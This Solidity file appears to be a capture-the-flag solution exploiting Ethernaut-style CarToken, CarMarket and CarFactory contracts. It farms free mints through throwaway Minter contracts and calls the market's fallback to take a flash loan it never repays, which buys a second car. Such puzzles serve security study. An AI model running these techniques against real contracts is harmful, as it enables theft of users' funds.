// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;
import './src/CarFactory.sol';
import './src/CarMarket.sol';
import './src/CarToken.sol';

//import 'hardhat/console.sol';

contract Minter {
  address internal constant carToken = 0x82b9835f1013d9fc99dEfDc63eC4807998219b3b;

  constructor() {
    // Get the free CarToken
    CarToken(carToken).mint();
    // transfer to the main exploit contract
    CarToken(carToken).transfer(msg.sender, 1 ether);
  }
}

contract EthernautCarExploitV1 {
  address internal constant carToken = 0x82b9835f1013d9fc99dEfDc63eC4807998219b3b;
  address internal constant carMarket = 0xf64db07E85089427Dd630e3cb65acc7F3394f6eA;
  address internal constant carFactory = 0x66ec6B0f30754123bdF9ACF4d8F4E2Bdf5D36f4F;

  // Mint from the main contract in order to be registered and be able to call the flash loan method
  function mintSelf() external {
    // Get the free CarToken
    CarToken(carToken).mint();
    // Allow the marketplace to pull the CarToken
    CarToken(carToken).approve(carMarket, type(uint256).max);
    // Purchase the first car cost the amount of CarToken generated before
    CarMarket(carMarket).purchaseCar('color 1', 'model 1', 'plateNumber 1');
  }

  // Create minter contract and accumulate CarToken
  function mint(uint256 _minterCount) external {
    for (uint256 i = 0; i < _minterCount; i++) {
      new Minter();
    }
  }

  // Send CarToken to the CarFactory in order to be able to flash loan up to it holding
  function transferToCarFactory(uint256 _amount) external {
    CarToken(carToken).transfer(carFactory, _amount);
  }

  function execute(uint256 _amount) external {
    // Prepare the encoded data to call the CarMarket fallback to call the CarFactory flash loan
    bytes memory data = abi.encodeWithSelector(CarFactory.flashLoan.selector, _amount, address(this));
    // Call the fallback
    (bool success, ) = carMarket.call(data);
    require(success, 'Call fallback failed');
  }

  function purchaseSecondCar() external {
    // Now contract have keep the 100k transferred from the CarMarket (CarFactory balance unchanged)
    // We can purchase another car for the same cost as the first one
    CarMarket(carMarket).purchaseCar('color 2', 'model 2', 'plateNumber 2');
  }

  function receivedCarToken(address _carFactory) external {}
}
